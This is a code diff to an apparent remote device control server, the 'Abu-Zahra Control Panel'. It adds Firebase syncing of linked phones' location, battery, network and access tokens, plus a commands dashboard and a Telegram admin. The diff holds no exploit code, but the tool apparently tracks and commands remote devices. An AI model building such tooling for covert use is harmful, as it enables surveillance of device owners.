@@ -401,6 +401,16 @@ def update_device(device_id, updates):
             d["last_seen"] = ts()
             devices[i] = d
             save_devices(devices)
+            # Sync to Firebase linked_devices
+            try:
+                import asyncio
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    asyncio.ensure_future(_firebase_sync_device(d))
+                else:
+                    loop.run_until_complete(_firebase_sync_device(d))
+            except RuntimeError:
+                pass
             return d
     return None
 
@@ -418,7 +428,37 @@ def add_device(device_data):
     devices.append(device_data)
     save_devices(devices)
     append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
+    # Push to Firebase linked_devices for dashboard sync
+    try:
+        import asyncio
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            asyncio.ensure_future(_firebase_sync_device(device_data))
+        else:
+            loop.run_until_complete(_firebase_sync_device(device_data))
+    except RuntimeError:
+        asyncio.run(_firebase_sync_device(device_data))
     return device_data
+
+
+async def _firebase_sync_device(device_data):
+    """Push a single device to Firebase /linked_devices/{device_id}"""
+    did = device_data.get("id", "")
+    if not did:
+        return
+    await firebase_set(f"linked_devices/{did}", {
+        "id": did,
+        "active": device_data.get("active", True),
+        "name": device_data.get("name", did),
+        "model": device_data.get("model", ""),
+        "brand": device_data.get("brand", ""),
+        "os": device_data.get("os", ""),
+        "battery": device_data.get("battery", ""),
+        "network": device_data.get("network", ""),
+        "location": device_data.get("location", ""),
+        "last_seen": device_data.get("last_seen", ""),
+        "created_at": device_data.get("created_at", ""),
+    })
 
 
 def remove_device(device_id):
@@ -428,6 +468,16 @@ def remove_device(device_id):
         return False
     save_devices(new_devices)
     append_event("Device removed", {"id": device_id})
+    # Also remove from Firebase
+    try:
+        import asyncio
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            asyncio.ensure_future(firebase_set(f"linked_devices/{device_id}", None))
+        else:
+            loop.run_until_complete(firebase_set(f"linked_devices/{device_id}", None))
+    except RuntimeError:
+        asyncio.run(firebase_set(f"linked_devices/{device_id}", None))
     return True
 
 
@@ -2413,7 +2463,7 @@ th{color:var(--text2);font-weight:500}
 
 <div class="app" id="app">
 <nav class="sidebar" id="sidebar">
-<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.6</span></div>
+<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.7</span></div>
 <a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
 <a onclick="showPage('devices')">📱 Devices</a>
 <a onclick="showPage('commands')">🎮 Commands</a>
@@ -3076,6 +3126,97 @@ async def firebase_result_listener():
         await asyncio.sleep(3)
 
 # ============================================================================
+# FIREBASE-TO-LOCAL DEVICE SYNC TASK
+# ============================================================================
+
+async def firebase_device_sync_loop():
+    """Periodically sync devices from Firebase linked_devices to local devices.json.
+    This ensures that devices linked via Telegram bot OR via Firebase directly
+    always appear in the web dashboard (which reads from local storage)."""
+    log.info("Firebase device sync loop started")
+    while True:
+        try:
+            if not firebase_connected:
+                await asyncio.sleep(30)
+                continue
+
+            # Read devices from Firebase /linked_devices
+            fb_devices = await firebase_get("linked_devices")
+            if fb_devices and isinstance(fb_devices, dict):
+                local_devices = get_devices()
+                local_ids = {d.get("id") for d in local_devices}
+                updated = False
+
+                for device_id, fb_data in fb_devices.items():
+                    if not isinstance(fb_data, dict):
+                        continue
+                    if device_id not in local_ids:
+                        # New device from Firebase - add to local storage
+                        device_entry = {
+                            "id": device_id,
+                            "token": fb_data.get("token", secrets.token_urlsafe(32)),
+                            "active": fb_data.get("active", True),
+                            "name": fb_data.get("name", device_id),
+                            "model": fb_data.get("model", ""),
+                            "brand": fb_data.get("brand", ""),
+                            "os": fb_data.get("os", ""),
+                            "battery": fb_data.get("battery", ""),
+                            "network": fb_data.get("network", ""),
+                            "location": fb_data.get("location", ""),
+                            "last_seen": fb_data.get("last_seen", ts()),
+                            "created_at": fb_data.get("created_at", ts()),
+                            "synced_from_firebase": True,
+                        }
+                        local_devices.append(device_entry)
+                        updated = True
+                        log.info("Synced device from Firebase: %s (%s)", device_id, fb_data.get("name", ""))
+                        append_event("Device synced from Firebase", {"id": device_id, "name": fb_data.get("name", "")})
+                    else:
+                        # Existing device - update fields from Firebase if newer
+                        for d in local_devices:
+                            if d.get("id") == device_id:
+                                fb_last = fb_data.get("last_seen", "")
+                                local_last = d.get("last_seen", "")
+                                if fb_last and fb_last > local_last:
+                                    d["active"] = fb_data.get("active", d.get("active"))
+                                    d["battery"] = fb_data.get("battery", d.get("battery"))
+                                    d["network"] = fb_data.get("network", d.get("network"))
+                                    d["location"] = fb_data.get("location", d.get("location"))
+                                    d["last_seen"] = fb_last
+                                    updated = True
+
+                if updated:
+                    save_devices(local_devices)
+
+            # Also push local devices TO Firebase (bidirectional sync)
+            local_devices = get_devices()
+            if local_devices:
+                fb_sync_data = {}
+                for d in local_devices:
+                    did = d.get("id", "")
+                    if did:
+                        fb_sync_data[did] = {
+                            "id": did,
+                            "active": d.get("active", False),
+                            "name": d.get("name", did),
+                            "model": d.get("model", ""),
+                            "brand": d.get("brand", ""),
+                            "os": d.get("os", ""),
+                            "battery": d.get("battery", ""),
+                            "network": d.get("network", ""),
+                            "location": d.get("location", ""),
+                            "last_seen": d.get("last_seen", ""),
+                            "created_at": d.get("created_at", ""),
+                        }
+                await firebase_set("linked_devices", fb_sync_data)
+
+        except Exception as exc:
+            log.error("Firebase device sync error: %s", exc)
+
+        await asyncio.sleep(15)  # Sync every 15 seconds
+
+
+# ============================================================================
 # SESSION CLEANUP TASK
 # ============================================================================
 
@@ -3135,7 +3276,7 @@ def create_app():
         return web.json_response({
             "ok": True,
             "status": "running",
-            "version": "3.6",
+            "version": "3.7",
             "firebase": firebase_connected,
             "uptime": get_uptime(),
             "devices": len(get_devices()),
@@ -3193,7 +3334,7 @@ def create_app():
 async def on_startup(app):
     ensure_data_dir()
     log.info("=" * 60)
-    log.info("Abu-Zahra Server v3.6 starting...")
+    log.info("Abu-Zahra Server v3.7 starting...")
     log.info("Domain: %s", SERVER_DOMAIN)
     log.info("Port: %d", SERVER_PORT)
     log.info("Admin: %d", ADMIN_CHAT_ID)
@@ -3214,6 +3355,8 @@ async def on_startup(app):
     app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
     # Start Firebase result listener
     app["fb_listener_task"] = asyncio.create_task(firebase_result_listener())
+    # Start Firebase-to-local device sync
+    app["fb_sync_task"] = asyncio.create_task(firebase_device_sync_loop())
     
     # Notify admin
     try:
@@ -3237,6 +3380,8 @@ async def on_cleanup(app):
         app["cleanup_task"].cancel()
     if "fb_listener_task" in app:
         app["fb_listener_task"].cancel()
+    if "fb_sync_task" in app:
+        app["fb_sync_task"].cancel()
     global _tg_session
     if _tg_session and not _tg_session.closed:
         await _tg_session.close()
